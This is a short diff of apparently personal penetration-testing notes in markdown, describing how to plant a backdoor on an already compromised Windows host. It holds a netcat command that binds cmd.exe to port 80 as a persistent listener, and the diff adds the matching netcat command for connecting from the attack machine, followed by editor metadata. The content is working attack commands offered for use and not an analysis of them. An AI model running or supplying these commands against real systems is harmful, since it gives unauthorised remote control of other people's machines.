@@ -41,8 +41,9 @@ on the local host:
 You have compromised a Windows host and you wish to establish a backdoor that you will be able to connect to from your BackTrack attack machine.
 on the compromised windows host:
 `# nc -l -p 80 -d -e cmd.exe -L`
-
+on the local host:
+`# nc [remote host] 80`
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTg1MjM3NzE0MCw1Nzg1OTM4NDIsMTE5OT
+eyJoaXN0b3J5IjpbLTMxNzQwMTQ4MSw1Nzg1OTM4NDIsMTE5OT
 I1Mzk3MCw5NDYwMjIzMjMsMTM3Mjk4NjIwMF19
 -->
